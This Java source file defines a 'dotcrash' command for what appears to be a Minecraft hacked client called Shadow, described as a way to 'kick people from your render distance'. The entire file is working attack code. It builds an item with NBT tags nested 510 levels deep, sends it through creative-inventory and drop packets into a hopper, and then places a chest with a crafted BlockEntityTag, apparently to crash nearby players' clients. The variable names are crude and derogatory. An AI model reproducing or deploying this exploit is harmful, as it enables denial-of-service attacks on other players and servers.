package net.shadow.feature.command;

import net.minecraft.block.BlockState;
import net.minecraft.block.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtDouble;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.math.Direction;
import net.shadow.Shadow;
import net.shadow.feature.base.Command;
import java.util.List;
import net.shadow.plugin.Notification;
import net.shadow.plugin.NotificationSystem;
import net.shadow.utils.Utils;

public class DotCrashCmd extends Command {
    int sync = 0;

    public DotCrashCmd() {
        super("dotcrash", "kick people from your render distance");
    }

    @Override
    public void call(String[] args) {
        BlockState b = Shadow.c.world.getBlockState(Shadow.c.player.getBlockPos().offset(Direction.DOWN, 1));
        if (b.getBlock().equals(Blocks.HOPPER)) {
            ItemStack dogsittinggay = new ItemStack(Items.STICK, 1);
            NbtCompound main = new NbtCompound();
            NbtCompound compound = new NbtCompound();
            for (int i = 0; i < 510; i++) {
                NbtCompound newCompound = new NbtCompound();
                newCompound.put("tag", compound);
                compound = newCompound;
            }
            main.put("tag", compound);
            dogsittinggay.setNbt(main);
            new Thread(() -> {
                Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(Shadow.c.player.getInventory().selectedSlot + 36, dogsittinggay));
                Shadow.c.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.LookAndOnGround(0, 90, true));
                Shadow.c.player.networkHandler.sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.DROP_ALL_ITEMS, Shadow.c.player.getBlockPos(), Direction.DOWN));
                Utils.sleep(100);
                ItemStack ez = new ItemStack(Items.CHEST, 1);
                NbtCompound nbt = new NbtCompound();
                nbt.put("x", NbtDouble.of(Shadow.c.player.getX()));
                nbt.put("y", NbtDouble.of(Shadow.c.player.getY() - 1));
                nbt.put("z", NbtDouble.of(Shadow.c.player.getZ()));
                NbtCompound fuck = new NbtCompound();
                fuck.put("BlockEntityTag", nbt);
                ez.setNbt(fuck);
                Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(Shadow.c.player.getInventory().selectedSlot + 36, ez));
            }).start();

        } else {

            NotificationSystem.notifications.add(new Notification("DotCrash", "Stand on a hopper", 150));
        }
    }

}
